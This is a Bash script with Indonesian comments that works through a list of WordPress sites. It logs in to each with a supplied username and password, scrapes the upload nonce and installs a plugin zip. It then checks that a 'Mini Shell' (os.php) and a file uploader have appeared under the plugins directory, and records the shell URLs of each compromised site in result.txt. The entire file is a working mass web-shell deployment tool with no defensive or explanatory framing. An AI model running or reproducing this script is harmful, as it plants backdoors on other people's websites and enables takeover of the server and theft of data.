#!/bin/bash


# FUNGSI LOGIN DAN UPLOAD
login(){
	# generat angka random
	rand=$(head /dev/urandom | tr -dc 0-9 | head -c 5 ; echo '')

	# user agent 
	ua='Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0'

	# PLUGIN FILE. KALO GAK NGERTI JANGAN DIRUBAH
	pluginzip='wpfast.zip'

	# path plugin upload
	pluginpath="$1/wp-admin/plugin-install.php"

	printf "    [*] Try Login "

	# curl login dan menyimpan output ke dalam log
	# timeout diset dengan waktu 2 menit (120 detik) [JANGAN DIGANTI]
	curl -s --compressed --connect-timeout 120 --cookie-jar log/cookie_${rand}.tmp -X POST "$1/wp-login.php" -L -H "User-Agent: ${ua}" -H "Referer: ${1}/wp-login.php" --data "log=${2}&pwd=${3}&wp-submit=Log In&redirect_to=${pluginpath}" >> log/output_${rand}.tmp

	# if statment / penyamaan
	if [[ $(cat log/output_${rand}.tmp) == '' ]]; then
		printf "[ FAILED ] [ Connection Lost/Site Die ]\n"
	elif [[ $(cat log/output_${rand}.tmp) =~ 'adminmenumain' ]]; then
		# mengambil code wponce dari output file
		wponce=$(cat log/output_${rand}.tmp | grep -Po '(?<=name="_wpnonce" value=").*?(?=")')
		printf "[ OK ]\n"
		printf "    [*] Try Upload "
		pathupload="$1/wp-admin/update.php?action=upload-plugin"

		# curl untuk upload zipfile
		# timeout diset dengan waktu 2 menit (120 detik) [JANGAN DIGANTI]
		curl -s --compressed --connect-timeout 120 --cookie log/cookie_${rand}.tmp -X POST "$pathupload" -L -H "User-Agent: ${ua}" -F "_wpnonce=${wponce}" -F "_wp_http_referer=/wp-admin/plugin-install.php" -F "pluginzip=@${pluginzip}" -F "install-plugin-submit=Install Now" >> log/output_upload_${rand}.tmp
		
		# mengecek file yang di upload
		cekshell=$(curl -s "$1/wp-content/plugins/wpfast/inc/os.php" -L)
		cekuploader=$(curl -s "$1/wp-content/plugins/wpfast/inc/uploader.php" -L)
		if [[ $cekshell =~ 'Coder Ditinggal Rabi' || $cekuploader =~ 'MAKLO UPLOADER' ]]; then
			printf "[ OK ]\n"
			printf "        => Mini Shell : $1/wp-content/plugins/wpfast/inc/os.php\n"
			printf "        => Uploader : $1/wp-content/plugins/wpfast/inc/uploader.php\n"

			# menyimpan hasil
			echo "===============================================" >> result.txt
			echo "Mini Shell : $1/wp-content/plugins/wpfast/inc/os.php" >> result.txt
			echo "Uploader : $1/wp-content/plugins/wpfast/inc/uploader.php" >> result.txt
		else
			printf "[ FAILED ]\n"
			echo "$1/wp-login.php" >> failed-upload.txt
		fi
	else
		echo "$1" >> failed-login.txt	
		printf "[ FAILED ]\n"
	fi

}


# membuat direktori log untuk penempatan cookie dan output file
if [[ ! -d log ]]; then
	mkdir log
else
	printf "\nRemoving older log... \n\n"
	rm -rf log/*
	sleep 1
fi

echo

# input user

printf "[=] Input required first: \n"
printf "    [*] Username: "; read username;
if [[ $username == '' ]]; then
	printf "        [!] Username is a required. Try again!\n"
	printf "    [*] Username: "; read username;
fi

printf "    [*] Password: "; read password;
if [[ $password == '' ]]; then
	printf "        [!] Password is a required. Try again!\n"
	printf "    [*] Password: "; read password;
fi

printf "[=] List of Target(TXT): "; read TargetList;

if [[ $TargetList == '' ]]; then
	printf "    [!] $TargetList is a required. Don't leave it blank.\n"
	printf "    [*] List Files: ";ls;
	printf "[=] List of Target(TXT): "; read TargetList;
fi
if [[ ! -f $TargetList ]]; then
	printf "    [!] Target List Not Found. Please Check Your filename.\n"
	printf "    [*] List Files: ";ls;
	printf "[=] List of Target(TXT): "; read TargetList;
fi

echo
IFS=$'\r\n' GLOBIGNORE='*' command eval  'target=($(cat $TargetList))'
for (( i = 0; i < "${#target[@]}"; i++ )); do
	sites="${target[$i]}";

	printf "[=] Site => $sites \n"

	login $sites $username $password;
done